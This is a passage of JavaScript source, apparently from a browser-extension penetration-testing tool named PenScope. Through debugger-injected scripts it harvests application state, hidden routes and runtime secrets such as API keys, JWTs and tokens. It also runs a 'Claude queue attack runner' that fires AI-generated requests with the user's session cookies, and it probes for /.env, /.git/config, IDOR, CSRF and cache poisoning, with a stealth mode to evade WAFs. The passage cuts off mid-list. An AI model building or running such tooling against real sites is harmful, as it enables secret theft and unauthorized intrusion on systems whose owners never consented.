  try{var rdx=window.__REDUX_STORE__||window.store||window.__store__;if(rdx&&rdx.getState)R.stores.push({name:"Redux Store",type:"redux",data:safeStr(rdx.getState(),5000)});}catch(e){}
  // Vue + Vue Router (v5.1: deep recursive)
  var vEl=document.querySelector("[data-v-]")||document.getElementById("app");
  if(vEl&&vEl.__vue__){R.framework=R.framework||{name:"Vue.js"};try{if(vEl.__vue__.$data)R.stores.push({name:"Vue Data",type:"vue-data",data:safeStr(vEl.__vue__.$data,3000)});if(vEl.__vue__.$store)R.stores.push({name:"Vuex",type:"vuex",data:safeStr(vEl.__vue__.$store.state,5000)});if(vEl.__vue__.$router){
    function walkVueRoutes(routes,prefix){routes.forEach(function(r){
      var fp=((prefix||"")+"/"+((r.path||"").replace(/^\//,""))).replace(/\/+/g,"/");
      R.routes.push({path:fp,name:r.name||"",meta:r.meta||{}});
      addRoute(fp,"vue-router","route",r.name||"");
      if(r.children)walkVueRoutes(r.children,fp);
      if(r.alias){var al=Array.isArray(r.alias)?r.alias:[r.alias];al.forEach(function(a){addRoute(a,"vue-router-alias","alias");});}
    });}
    var vR=vEl.__vue__.$router.options&&vEl.__vue__.$router.options.routes||[];walkVueRoutes(vR,"");
    if(typeof vEl.__vue__.$router.getRoutes==="function"){try{vEl.__vue__.$router.getRoutes().forEach(function(r){addRoute(r.path,"vue-router-getRoutes","route",r.name||"");});}catch(e){}}
  }}catch(e){}}
  // Vue 3
  try{if(vEl&&vEl.__vue_app__){R.framework=R.framework||{name:"Vue 3"};var vApp=vEl.__vue_app__;
    if(vApp.config&&vApp.config.globalProperties&&vApp.config.globalProperties.$router){
      var v3R=vApp.config.globalProperties.$router;
      if(typeof v3R.getRoutes==="function"){v3R.getRoutes().forEach(function(r){addRoute(r.path,"vue3-router","route",r.name||"");});}
      if(v3R.options&&v3R.options.routes){(function walkV3(routes,prefix){routes.forEach(function(r){
        var fp=((prefix||"")+"/"+((r.path||"").replace(/^\//,""))).replace(/\/+/g,"/");
        addRoute(fp,"vue3-router-config","route",r.name||"");
        if(r.children)walkV3(r.children,fp);
      });})(v3R.options.routes,"");}
    }
    // Pinia
    if(vApp.config&&vApp.config.globalProperties&&vApp.config.globalProperties.$pinia){try{var pinia=vApp.config.globalProperties.$pinia;if(pinia.state&&pinia.state.value){Object.keys(pinia.state.value).forEach(function(k){R.stores.push({name:"Pinia: "+k,type:"pinia",data:safeStr(pinia.state.value[k],3000)});});}}catch(e){}}
  }}catch(e){}
  // Next.js
  if(window.__NEXT_DATA__){R.framework=R.framework||{name:"Next.js"};try{R.frameworkState.nextData={page:window.__NEXT_DATA__.page,buildId:window.__NEXT_DATA__.buildId,runtimeConfig:window.__NEXT_DATA__.runtimeConfig,query:window.__NEXT_DATA__.query};addRoute(window.__NEXT_DATA__.page,"nextjs-page","page");}catch(e){}}
  // v5.1: Next.js __BUILD_MANIFEST — reveals ALL pages
  try{if(window.__BUILD_MANIFEST){Object.keys(window.__BUILD_MANIFEST).forEach(function(page){if(page&&page.startsWith("/")&&page!=="/")addRoute(page,"nextjs-build-manifest","page");});R.frameworkState.buildManifestPages=Object.keys(window.__BUILD_MANIFEST).length;}}catch(e){}
  // v5.1: Next.js router internals
  try{if(window.__next&&window.__next.router){var nr=window.__next.router;
    if(nr.components)Object.keys(nr.components).forEach(function(p){addRoute(p,"nextjs-router-components","page");});
    if(nr.pageLoader&&nr.pageLoader.pages)Object.keys(nr.pageLoader.pages).forEach(function(p){addRoute(p,"nextjs-page-loader","page");});
  }}catch(e){}
  // v5.1: Nuxt.js deep
  try{if(window.__NUXT__){R.framework=R.framework||{name:"Nuxt.js"};
    if(window.$nuxt&&window.$nuxt.$router&&window.$nuxt.$router.options&&window.$nuxt.$router.options.routes){
      (function walkNuxt(routes,prefix){routes.forEach(function(r){
        var fp=((prefix||"")+"/"+((r.path||"").replace(/^\//,""))).replace(/\/+/g,"/");
        addRoute(fp,"nuxt-router","route",r.name||"");
        if(r.children)walkNuxt(r.children,fp);
      });})(window.$nuxt.$router.options.routes,"");
    }
    if(window.__NUXT__.config)R.stores.push({name:"Nuxt Config",type:"nuxt-config",data:safeStr(window.__NUXT__.config,3000)});
  }}catch(e){}
  // Svelte
  if(document.querySelector("[class*='svelte-']"))R.framework=R.framework||{name:"Svelte"};
  // Ember
  if(window.Ember||window.EmberENV){R.framework=R.framework||{name:"Ember.js"};
    try{if(window.Ember&&window.Ember.Application){var ns=window.Ember.Application.NAMESPACES_BY_ID;if(ns){Object.keys(ns).forEach(function(appName){try{var app=ns[appName];if(app&&app.__container__){var router=app.__container__.lookup("router:main");if(router&&router._routerMicrolib&&router._routerMicrolib.recognizer&&router._routerMicrolib.recognizer.names){Object.keys(router._routerMicrolib.recognizer.names).forEach(function(name){addRoute("/"+name.replace(/\./g,"/"),"ember-router","route",name);});}}}catch(e){}});}}
    }catch(e){}
  }

  // === v5.1: WEBPACK MODULE MINING ===
  try{var wpModules=window.__webpack_modules__;
    if(wpModules&&typeof wpModules==="object"&&!Array.isArray(wpModules)){
      var mKeys=Object.keys(wpModules);
      R.frameworkState.webpackModuleCount=mKeys.length;
      var sampleSize=Math.min(mKeys.length,200);
      for(var mi=0;mi<sampleSize;mi++){try{var mod=wpModules[mKeys[mi]];
        if(typeof mod==="function"){var modSrc=mod.toString();
          if(modSrc.length>50&&modSrc.length<100000){
            var ur=/["'](\/(?:api|v\d|app|auth|user|admin|dashboard|settings|profile|search|graphql|account|payment|upload|download|notification|report|manage|config)[a-zA-Z0-9_\-/.:{}\[\]]*?)["']/g;
            var um;while((um=ur.exec(modSrc))!==null)addRoute(um[1],"webpack-module","endpoint","module:"+mKeys[mi]);
            var fr=/(?:fetch|axios\.\w+)\s*\(\s*["'`](\/[^"'`\s]{2,100})["'`]/g;
            while((um=fr.exec(modSrc))!==null)addRoute(um[1],"webpack-module-fetch","endpoint","module:"+mKeys[mi]);
          }}
      }catch(e){}}
    }
    // webpackChunk array
    var wpChunk=window.webpackChunk;
    if(wpChunk&&Array.isArray(wpChunk)){
      R.frameworkState.webpackChunkCount=wpChunk.length;
      wpChunk.forEach(function(chunk,ci){if(!chunk||!Array.isArray(chunk)||chunk.length<2)return;
        var cMods=chunk[1];if(typeof cMods==="object"){Object.keys(cMods).slice(0,50).forEach(function(k){try{var fn=cMods[k];
          if(typeof fn==="function"){var src=fn.toString();if(src.length>50&&src.length<100000){
            var ur2=/["'](\/(?:api|v\d|app|auth|user|admin|dashboard|settings|profile|search|graphql|account|payment)[a-zA-Z0-9_\-/.:{}\[\]]*?)["']/g;
            var um2;while((um2=ur2.exec(src))!==null)addRoute(um2[1],"webpack-chunk","endpoint","chunk:"+ci);
          }}}catch(e){}});}
      });
    }
  }catch(e){}
  // v5.1: Webpack public path + chunk URL pattern
  try{var wr=window.__webpack_require__||window.webpackRequire;
    if(wr){if(wr.u&&typeof wr.u==="function")R.frameworkState.webpackChunkUrlPattern=wr.u.toString().substring(0,500);
      if(wr.p)R.frameworkState.webpackPublicPath=wr.p;}
  }catch(e){}

  // === v5.1: SERVICE WORKER PRECACHE MANIFEST ===
  try{["__WB_MANIFEST","__precacheManifest","self.__WB_MANIFEST"].forEach(function(name){try{var val=window[name];
    if(val&&Array.isArray(val)){val.forEach(function(entry){
      var url=typeof entry==="string"?entry:(entry.url||entry.path||"");
      if(url&&url.startsWith("/")&&!url.match(/\.(js|css|png|jpg|svg|ico|woff|map)$/i))addRoute(url,"sw-precache","precached");
    });R.frameworkState.precacheCount=val.length;}}catch(e){}});
  }catch(e){}

  // === v5.1: GRAPHQL CACHE READING (Apollo, Relay, urql) ===
  try{var apollo=window.__APOLLO_CLIENT__||window.__apollo_client__;
    if(!apollo){Object.getOwnPropertyNames(window).forEach(function(k){try{if(!apollo&&window[k]&&window[k].cache&&window[k].queryManager)apollo=window[k];}catch(e){}});}
    if(apollo&&apollo.cache){
      var cData=apollo.cache.extract?apollo.cache.extract():apollo.cache.data;
      if(cData){R.stores.push({name:"Apollo Cache",type:"apollo-cache",data:safeStr(cData,5000)});
        var tNames=new Set();
        (function walkAC(obj,d){if(!obj||d>5||typeof obj!=="object")return;try{Object.keys(obj).forEach(function(k){
          if(k==="__typename"&&typeof obj[k]==="string")tNames.add(obj[k]);
          else if(typeof obj[k]==="object")walkAC(obj[k],d+1);});}catch(e){}})(cData,0);
        tNames.forEach(function(tn){addRoute(tn,"apollo-cache-typename","graphql-type");});
      }
      if(apollo.queryManager&&apollo.queryManager.queries){
        apollo.queryManager.queries.forEach(function(q){try{if(q.document&&q.document.definitions){
          q.document.definitions.forEach(function(def){
            if(def.name&&def.name.value)addRoute(def.name.value,"apollo-active-query",def.operation||"query");
            if(def.selectionSet&&def.selectionSet.selections)def.selectionSet.selections.forEach(function(sel){
              if(sel.name&&sel.name.value)addRoute(sel.name.value,"apollo-query-field","graphql-field");});
          });}}catch(e){}});
      }
    }
  }catch(e){}
  try{if(window.__RELAY_STORE__||window.__relay_store__)R.stores.push({name:"Relay Store",type:"relay",data:safeStr(window.__RELAY_STORE__||window.__relay_store__,3000)});}catch(e){}
  try{if(window.__URQL_DATA__)R.stores.push({name:"urql Cache",type:"urql",data:safeStr(window.__URQL_DATA__,3000)});}catch(e){}

  // === UNIVERSAL GLOBAL SCANNING ===
  var skip={"chrome":1,"document":1,"window":1,"self":1,"top":1,"parent":1,"frames":1,"location":1,"navigator":1,"performance":1,"screen":1,"history":1,"localStorage":1,"sessionStorage":1,"console":1,"alert":1,"confirm":1,"prompt":1,"fetch":1,"XMLHttpRequest":1,"Array":1,"Object":1,"String":1,"Number":1,"Boolean":1,"Function":1,"RegExp":1,"Date":1,"Math":1,"JSON":1,"Promise":1,"Map":1,"Set":1,"WeakMap":1,"WeakSet":1,"Symbol":1,"Proxy":1,"Reflect":1,"Error":1,"eval":1,"parseInt":1,"parseFloat":1,"isNaN":1,"isFinite":1,"undefined":1,"NaN":1,"Infinity":1,"encodeURI":1,"decodeURI":1,"encodeURIComponent":1,"decodeURIComponent":1,"setTimeout":1,"setInterval":1,"clearTimeout":1,"clearInterval":1,"requestAnimationFrame":1,"cancelAnimationFrame":1,"getComputedStyle":1,"matchMedia":1,"innerWidth":1,"innerHeight":1,"outerWidth":1,"outerHeight":1,"scrollX":1,"scrollY":1,"origin":1,"close":1,"stop":1,"focus":1,"blur":1,"open":1,"print":1,"postMessage":1,"find":1,"getSelection":1,"btoa":1,"atob":1,"structuredClone":1,"queueMicrotask":1,"caches":1,"indexedDB":1,"crypto":1,"MutationObserver":1,"IntersectionObserver":1,"ResizeObserver":1,"WebSocket":1,"Worker":1,"length":1,"name":1,"status":1,"closed":1,"opener":1,"frameElement":1,"external":1,"cookieStore":1,"trustedTypes":1,"devicePixelRatio":1};
  // Known app config globals
  var appGlobals=["eduWorx","appConfig","appSettings","siteConfig","APP_CONFIG","__CONFIG__","__ENV__","ENV","config","Tracking_LMS","__INITIAL_STATE__","__PRELOADED_STATE__","featureFlags","__APP_DATA__","__RUNTIME_CONFIG__","__STORE__"];
  appGlobals.forEach(function(nm){try{var obj=window[nm];if(!obj||typeof obj!=="object")return;var str=JSON.stringify(obj);if(!str||str.length<3)return;R.stores.push({name:"window."+nm,type:"global-object",data:str.substring(0,5000)});
    if(obj.currentUser){R.stores.push({name:nm+".currentUser",type:"user-identity",data:safeStr(obj.currentUser,5000)});var pf={};Object.keys(obj.currentUser).forEach(function(k){if(/admin|system|manage|teaching|parent|category|role|permission/i.test(k))pf[k]=obj.currentUser[k];});if(Object.keys(pf).length)R.stores.push({name:"Privilege Escalation Surface",type:"privesc-fields",data:safeStr(pf,3000)});}
    if(obj.config){R.stores.push({name:nm+".config",type:"app-config",data:safeStr(obj.config,5000)});var dis={};Object.keys(obj.config).forEach(function(k){if((obj.config[k]===false||obj.config[k]==="false"||obj.config[k]==="False")&&/enable|chat|invite|share|live|debug|admin|visit/i.test(k))dis[k]=obj.config[k];});if(Object.keys(dis).length)R.stores.push({name:"Disabled Features",type:"disabled-features",data:safeStr(dis,3000)});}
    var urls={};["storageBaseUrl","loginPageUrl","cdnurl","baseUrl","apiUrl","apiBaseUrl","wsUrl","graphqlUrl"].forEach(function(k){if(obj[k])urls[k]=obj[k];if(obj.config&&obj.config[k])urls[k]=obj.config[k];});if(Object.keys(urls).length)R.stores.push({name:"Infrastructure URLs",type:"urls",data:safeStr(urls,2000)});
  }catch(e){}});
  // Dynamic global scan
  try{Object.getOwnPropertyNames(window).forEach(function(key){if(skip[key]||key.indexOf("__")===0||key.indexOf("webkit")===0||key.indexOf("on")===0)return;try{var val=window[key];if(val===null||val===undefined)return;if(typeof val==="object"&&!Array.isArray(val)){var ks=Object.keys(val);if(ks.length>0&&ks.length<100){var hit=ks.some(function(k){return/api|key|token|secret|url|endpoint|config|auth|user|permission|role|admin|base|host|password|credential/i.test(k);});if(hit)R.interestingGlobals.push({name:key,type:"object",keys:ks.slice(0,30),preview:safeStr(val,1000)});}}else if(typeof val==="function"&&/auth|login|admin|api|fetch|request|secret|token|permission|role/i.test(key)){R.interestingGlobals.push({name:key,type:"function",source:val.toString().substring(0,300)});}}catch(e){}});}catch(e){}

  // === PROTOTYPE CHAIN WALKING ===
  var pTargets=["angular","React","Vue","$","jQuery","app","App","api","API","sdk","SDK","client","Client","auth","Auth"];
  pTargets.forEach(function(nm){try{var obj=window[nm];if(!obj||typeof obj!=="object")return;var methods=[];var vis=new Set();function wP(o,d,pfx){if(!o||d>3||vis.has(o))return;vis.add(o);Object.getOwnPropertyNames(o).forEach(function(k){if(k.indexOf("__")===0||k==="constructor"||k==="prototype")return;try{var v=o[k];if(typeof v==="function")methods.push({name:pfx?pfx+"."+k:k,args:gArgs(v)});else if(typeof v==="object"&&v!==null&&d<2)wP(v,d+1,pfx?pfx+"."+k:k);}catch(e){}});var proto=Object.getPrototypeOf(o);if(proto&&proto!==Object.prototype)wP(proto,d+1,pfx);}wP(obj,0,"");if(methods.length>0)R.protoMethods.push({object:nm,methods:methods.slice(0,50)});}catch(e){}});

  // === POSTMESSAGE DETECTION (scan inline scripts, NO patching) ===
  document.querySelectorAll("script:not([src])").forEach(function(s){var text=s.textContent||"";if(text.indexOf("addEventListener")>-1&&text.indexOf("message")>-1){var hasOC=/\.origin\s*[!=]==?\s*['"]|event\.origin|e\.origin/.test(text);var idx=text.indexOf("addEventListener");R.eventListeners.push({element:"script (static)",hasOriginCheck:hasOC,source:text.substring(idx,idx+300),risk:hasOC?"low":"high"});}});

  // === RUNTIME SECRET SCAN ===
  var chk=new Set();function dScan(obj,path,depth){if(!obj||depth>4||chk.has(obj))return;chk.add(obj);try{Object.keys(obj).forEach(function(key){var fp=path?path+"."+key:key;try{var val=obj[key];if(typeof val==="string"&&val.length>10&&val.length<500){if(/^(sk_|pk_|rk_)(live|test)_/.test(val))R.runtimeSecrets.push({path:fp,type:"Stripe Key",value:val.substring(0,100)});else if(/^AIza[0-9A-Za-z_-]{35}$/.test(val))R.runtimeSecrets.push({path:fp,type:"Google API Key",value:val.substring(0,100)});else if(/^eyJ[A-Za-z0-9_-]+\.eyJ/.test(val))R.runtimeSecrets.push({path:fp,type:"JWT",value:val.substring(0,100)});else if(/^gh[ps]_[A-Za-z0-9_]{36,}$/.test(val))R.runtimeSecrets.push({path:fp,type:"GitHub Token",value:val.substring(0,100)});else if(/^xox[bpors]-/.test(val))R.runtimeSecrets.push({path:fp,type:"Slack Token",value:val.substring(0,100)});else if(/mongodb(\+srv)?:\/\//.test(val))R.runtimeSecrets.push({path:fp,type:"MongoDB URI",value:val.substring(0,100)});else if(/postgres(ql)?:\/\//.test(val))R.runtimeSecrets.push({path:fp,type:"PostgreSQL URI",value:val.substring(0,100)});else if(/Bearer\s+[A-Za-z0-9_\-./+=]{20,}/.test(val))R.runtimeSecrets.push({path:fp,type:"Auth Header",value:val.substring(0,100)});}else if(typeof val==="object"&&val!==null&&depth<4){dScan(val,fp,depth+1);}}catch(e){}});}catch(e){}}
  ["__NEXT_DATA__","__NUXT__","__CONFIG__","__ENV__","config","appConfig","settings","ENV","APP_CONFIG","eduWorx","__INITIAL_STATE__","__PRELOADED_STATE__","featureFlags"].forEach(function(key){try{if(window[key])dScan(window[key],"window."+key,0);}catch(e){}});

  return JSON.stringify(R);
}

function runRuntimeExtraction(tabId){
  if(!_debugTabs.has(tabId))return;
  const script=`(${_extractionCode.toString()})()`;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:script,returnByValue:true,timeout:10000},(result)=>{
    if(chrome.runtime.lastError)return;
    if(result&&result.result&&result.result.value){
      try{
        const data=JSON.parse(result.result.value);
        const tab=T(tabId);
        const existing=tab.runtime?.ephemeralDOM||[];
        // v5.1: Merge discoveredRoutes from runtime into tab state
        const runtimeRoutes=data.discoveredRoutes||[];
        delete data.discoveredRoutes;
        tab.runtime=data;
        tab.runtime.ephemeralDOM=existing;
        runtimeRoutes.forEach(r=>{
          if(!seen(tabId,"dr",r.path+":"+r.source)){
            tab.discoveredRoutes.push(r);
          }
        });
      }catch(e){console.warn('[PenScope] runtimeExtraction parse',e.message||e);}
    }
  });
  // Also set up stealth MutationObserver for ephemeral DOM
  const mutScript=`(function(){if(window.__ps_mo)return 'exists';Object.defineProperty(document,'__ps_eph',{value:[],writable:true,enumerable:false,configurable:true});var obs=new MutationObserver(function(muts){muts.forEach(function(m){m.removedNodes.forEach(function(n){if(n.nodeType!==1)return;var html=n.outerHTML||'';if(html.length<10)return;var text=n.textContent||'';var interesting=/error|exception|stack|debug|admin|password|token|key|secret|internal|403|401|500/i.test(text);if(interesting||html.indexOf('type="hidden"')>-1){document.__ps_eph.push({tag:n.tagName,text:text.substring(0,300),html:html.substring(0,500),ts:Date.now(),interesting:interesting});if(document.__ps_eph.length>50)document.__ps_eph=document.__ps_eph.slice(-50);}});});});obs.observe(document.body||document.documentElement,{childList:true,subtree:true});window.__ps_mo=true;return 'setup';}())`;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:mutScript,returnByValue:true},()=>{void chrome.runtime.lastError;});
}

function collectEphemeralDOM(tabId){
  if(!_debugTabs.has(tabId))return;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:`(function(){try{var d=document.__ps_eph||[];document.__ps_eph=[];return JSON.stringify(d);}catch(e){return '[]';}})()`,returnByValue:true},(result)=>{
    if(chrome.runtime.lastError||!result||!result.result||!result.result.value)return;
    try{
      const items=JSON.parse(result.result.value);
      if(items.length){const tab=T(tabId);tab.runtime.ephemeralDOM=tab.runtime.ephemeralDOM||[];tab.runtime.ephemeralDOM.push(...items);if(tab.runtime.ephemeralDOM.length>50)tab.runtime.ephemeralDOM=tab.runtime.ephemeralDOM.slice(-50);}
    }catch(e){console.warn('[PenScope] ephemeralDOM parse',e.message||e);}
  });
}

// -------------------------------------------------------
// v6.0: CLAUDE QUEUE ATTACK RUNNER
// Executes a list of attacks parsed from a fenced JSON block on the user's clipboard
// (the response from the bidirectional → Claude / Sync from Claude flow). Each attack
// is one HTTP request synthesized from {type, endpoint|url, method, body, headers}
// and run in the page context with credentials:'include' so session cookies still apply.
// Findings are appended into tab.probeData.claudeAttacks (a new sub-array) and feed
// the chain analyzer on the next getData call. Uses chrome.scripting.executeScript so
// we don't need the debugger pipeline; this runs even if the user hasn't started a
// full probe.
// -------------------------------------------------------
async function runClaudeQueueAttacks(tabId,queue,customHeaders,stealth){
  const tab=T(tabId);
  if(!tab.probeData)tab.probeData={status:"done",startTime:Date.now(),requests:0,errors:[],aggroLevel:"medium",customHeaderCount:0,stealthMode:!!stealth};
  if(!Array.isArray(tab.probeData.claudeAttacks))tab.probeData.claudeAttacks=[];

  // Build absolute base URL from the tab. Falls back to "https://" + sender url host.
  let baseUrl="";
  try{const t=await chrome.tabs.get(tabId);baseUrl=t.url?new URL(t.url).origin:"";}catch(e){/* ignore */}
  if(!baseUrl)baseUrl=tab.url?(()=>{try{return new URL(tab.url).origin;}catch{return "";}})():"";

  // v6.0 — chrome.scripting.executeScript serializes `func` via toString() and re-injects
  // it into the page. We MUST use a named function (not new Function) because MV3 service
  // workers ban dynamic code construction via the default CSP. All the data the runner
  // needs comes through `args`; closure variables don't carry across the boundary.
  let results=[];
  try{
    const inj=await chrome.scripting.executeScript({target:{tabId},world:"MAIN",func:__pageRunClaudeQueue,args:[queue,customHeaders||{},!!stealth,baseUrl]});
    if(inj&&inj[0]&&Array.isArray(inj[0].result))results=inj[0].result;
  }catch(e){
    // Fallback: ISOLATED world (some pages have CSP that blocks MAIN-world injection)
    try{
      const inj2=await chrome.scripting.executeScript({target:{tabId},func:__pageRunClaudeQueue,args:[queue,customHeaders||{},!!stealth,baseUrl]});
      if(inj2&&inj2[0]&&Array.isArray(inj2[0].result))results=inj2[0].result;
    }catch(e2){throw e2;}
  }

  // Merge into tab state
  tab.probeData.claudeAttacks=tab.probeData.claudeAttacks.concat(results);
  tab.probeData.requests=(tab.probeData.requests||0)+results.length;
  tab.stackAttacks=Array.isArray(tab.stackAttacks)?tab.stackAttacks:[];
  // Promote interesting hits (200 status with non-trivial body) to stackAttacks/findings
  results.forEach(r=>{
    if(r&&r.status>=200&&r.status<400&&r.size>30){
      tab.stackAttacks.push({source:"claude-queue",type:r.attack&&r.attack.type||"custom",url:r.url,method:r.attack&&r.attack.method||"GET",status:r.status,evidence:(r.bodyPreview||"").substring(0,200),severity:(r.attack&&r.attack.severity_hint)||"medium"});
    }
  });
  markDirty(tabId);
  return results;
}

// -------------------------------------------------------
// v5.1: ACTIVE RECON ENGINE
// Opt-in mode that sends requests from page context (fetch)
// Uses session cookies for authenticated probing
// Requires Deep mode (debugger) to be enabled
// -------------------------------------------------------
async function runProbe(tabId,aggroLevel,customHeaders,recursive,stealth){
  const tab=T(tabId);
  tab.probeData={status:"running",startTime:Date.now(),requests:0,graphql:null,sourceMaps:[],swagger:[],probes:[],options:[],suffixes:[],errors:[],aggroLevel,bacResults:[],idorResults:[],corsResults:[],methodResults:[],openRedirects:[],raceResults:[],hppResults:[],subdomains:[],graphqlFuzz:[],jwtAlgResults:[],hostHeaderResults:[],cachePoisonResults:[],idorAutoResults:[],authRemovalResults:[],csrfResults:[],grpcReflection:null,compressionResults:[],wsHijackResults:[],cachePoisonProbe:[],timingOracle:[],coopCoepBypass:[],storagePartition:[],recursiveProbe:null,customHeaderCount:Object.keys(customHeaders||{}).length,stealthMode:stealth===true};

  // === Gather context from existing PenScope data ===
  const smUrls=[...new Set(tab.sourceMaps.map(s=>{
    let u=s.mapUrl||"";
    // Clean up: if .map is after query string, fix it
    if(u.includes("?")){const parts=u.split("?");if(parts[0].endsWith(".map"))u=parts[0];else if(parts[1]&&parts[1].endsWith(".map"))u=parts[0]+".map";}
    return u;
  }).filter(u=>u&&(u.startsWith("http")||u.startsWith("/"))&&u.endsWith(".map")))].slice(0,30);
  const swaggerUrls=[...new Set(tab.swaggerEndpoints.map(s=>s.url||s.path))].slice(0,10);

  // Find GraphQL endpoints
  const gqlPaths=new Set();
  tab.endpoints.forEach(e=>{if(/graphql|gql/i.test(e.path))gqlPaths.add(e.path);});
  tab.discoveredRoutes.forEach(r=>{if(/graphql|gql/i.test(r.path)&&r.path.startsWith("/"))gqlPaths.add(r.path);});
  tab.scriptSources.forEach(s=>{if(s.pattern==="GraphQL Endpoint")gqlPaths.add(s.value);});
  if(!gqlPaths.size)gqlPaths.add("/graphql");

  // Collect all API paths for OPTIONS probing
  const apiPaths=[...new Set(tab.endpoints.filter(e=>/\/api\//i.test(e.path)||/\/v\d+\//i.test(e.path)).map(e=>e.path))].slice(0,50);

  // Extract API prefixes for smart suffix bruteforce
  const prefixes=new Set();
  tab.endpoints.forEach(e=>{const m=e.path.match(/^(\/(?:api|app)\/(?:v\d+\/)?)/i);if(m)prefixes.add(m[1]);});
  tab.discoveredRoutes.forEach(r=>{if(r.path.startsWith("/")){const m=r.path.match(/^(\/(?:api|app)\/(?:v\d+\/)?)/i);if(m)prefixes.add(m[1]);}});

  // Recon paths
  const reconPaths=(tab.reconSuggestions||[]).map(s=>s.path);
  // Add extras not already in recon suggestions
  const extraProbes=["/.env","/debug","/info","/health","/status","/.git/HEAD","/.git/config","/server-info","/server-status","/.svn/entries","/.DS_Store","/wp-json","/api","/api/v1","/api/v2","/console","/_debug","/actuator","/actuator/env","/actuator/health","/actuator/mappings","/.well-known/openid-configuration","/.well-known/jwks.json","/trace","/graphql","/graphiql","/swagger.json","/swagger-ui.html","/api-docs","/openapi.json","/v1/api-docs","/v2/api-docs","/config","/admin","/login","/register","/phpinfo.php","/elmah.axd","/telescope","/horizon","/pulse"];
  const allProbes=[...new Set([...reconPaths,...extraProbes])];

  // Smart suffixes for API prefix bruteforce
  const SUFFIXES=["users","admin","roles","permissions","config","settings","debug","auth","login","register","password","reset","tokens","sessions","me","profile","account","upload","files","export","import","backup","download","logs","audit","health","status","metrics","info","internal","test","dev","docs","schema","swagger","graphql","webhooks","callbacks","notifications","search","delete","bulk","batch","keys","secrets","env","version","ping","groups","organizations","teams","invites","payments","billing","subscriptions","orders","reports","analytics","dashboard","system","features","flags","cache","jobs","queues","workers","emails","sms","otp","mfa","verify","confirm","refresh","revoke","impersonate","sudo"];

  // Build context — JSON.stringify output IS valid JavaScript (JSON is subset of JS)
  // Only need to escape backticks and ${ to protect the template literal
  const ctx={smUrls,swaggerUrls,gqlPaths:[...gqlPaths],apiPaths,prefixes:[...prefixes],allProbes,SUFFIXES,
    aggroLevel:aggroLevel||"medium",
    bacRoutes:(tab.permissionMatrix||[]).map(r=>({path:r.path,risk:r.risk,intent:r.intent})).slice(0,100),
    userId:tab.runtime?.frameworkState?.userId||"",
    idorEndpoints:(tab.idorTests||[]).slice(0,50).map(t=>({path:t.path||"",type:t.type})),
    observedApis:tab.endpoints.filter(e=>/\/api\//i.test(e.path)&&e.status===200).map(e=>({path:e.path,method:e.method||"GET",query:e.query||""})).slice(0,80),
    postBodiesCtx:(tab.postBodies||[]).slice(0,40).map(p=>({url:p.url||"",path:p.path,method:p.method,contentType:p.contentType,body:p.body.substring(0,2000)})),
    discoveredApis:(tab.discoveredRoutes||[]).filter(r=>r.path.startsWith("/api/")).map(r=>({path:r.path,intent:r.intent||"unknown"})).slice(0,200),
    pathParams:(tab.pathParams||[]).slice(0,100).map(p=>({path:p.path,paramIndex:p.paramIndex,value:p.value,type:p.type})),
    authHeaders:(tab.requestHeaders||[]).slice(0,50).map(h=>({url:h.url,method:h.method||"GET",headers:h.headers})),
    // All endpoints (not just /api/) for auth/CSRF testing
    allEndpoints:tab.endpoints.filter(e=>e.status===200&&e.method).map(e=>({url:e.url||"",path:e.path,method:e.method||"GET",host:e.host||"",query:e.query||""})).slice(0,100),
    // Cross-origin hosts seen in traffic
    crossOriginHosts:[...new Set(tab.endpoints.map(e=>e.host).filter(h=>h&&h!==tab.url?.split("/")[2]))].slice(0,20),
    // v5.4: gRPC endpoints for reflection probing
    grpcEndpoints:(tab.grpcEndpoints||[]).map(g=>({url:g.url,path:g.path,type:g.type})).slice(0,30),
    // v5.4: state-changing endpoints for compression testing
    stateChangingPosts:tab.endpoints.filter(e=>e.method==="POST"&&e.status===200).map(e=>({url:e.url,path:e.path})).slice(0,20),
    // v5.7: custom headers merged into every probe request
    customHeaders:customHeaders||{},
    // v5.7: smart recursive API discovery toggle
    recursive:recursive!==false,
    // v5.8: stealth mode — jitter + random pauses to evade WAFs
    stealth:stealth===true,
    // v5.9.2: Regex patterns injected via ctx so JSON.stringify preserves backslashes
    // perfectly through the template-literal → eval → string-parser → RegExp chain.
    // Defined here (module scope) and reconstructed in the probe eval as new RegExp(p.src, p.f).
    _re:{
      staticAsset:{src:"\\.(?:js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|pdf|mp4|mp3|webp|wasm)(?:\\?|$)",f:"i"},
      destructive:{src:"\\/(?:delete|remove|destroy|purge|drop|revoke|ban|deactivate|unsubscribe|cancel|uninstall|wipe)(?:\\/|$|\\?)",f:"i"},
      template:{src:"\\{[^}]+\\}",f:""},
      pathExtract:{src:"[\"'](\\/(?:api|v\\d+|graphql|gql|rest|admin|internal|app|auth|user|account|public)\\/[a-zA-Z0-9_\\-\\/.{}:?=&,%~]+)[\"']",f:"g"},
      assetFilter:{src:"\\.(?:js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|pdf|mp4|mp3|webp)(?:\\?|$)",f:"i"},
      version:{src:"\\/v(\\d+)\\/",f:""},
      bodyPatterns:[
        {n:"Auth Token",src:"\"(?:access_token|refresh_token|bearer|jwt|session_token|id_token|auth_token)\"\\s*:\\s*\"([^\"]{10,})\"",f:"gi",sev:"critical"},
        {n:"API Key",src:"\"(?:api_key|apiKey|api_secret|client_secret|secret_key|privateKey|private_key)\"\\s*:\\s*\"([^\"]{8,})\"",f:"gi",sev:"critical"},
        {n:"Password",src:"\"(?:password|passwd|pwd|pass_hash|password_hash)\"\\s*:\\s*\"([^\"]{1,})\"",f:"gi",sev:"critical"},
        {n:"Internal ID",src:"\"(?:user_id|userId|account_id|accountId|internal_id|employee_id|admin_id)\"\\s*:\\s*\"?([^\",}\\]\\s]{1,80})",f:"gi",sev:"medium"},
        {n:"Email",src:"\"(?:email|mail|user_email|emailAddress)\"\\s*:\\s*\"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})\"",f:"gi",sev:"low"},
        {n:"Phone",src:"\"(?:phone|mobile|phone_number|phoneNumber|tel)\"\\s*:\\s*\"?(\\+?[\\d\\s()-]{7,20})",f:"gi",sev:"medium"},
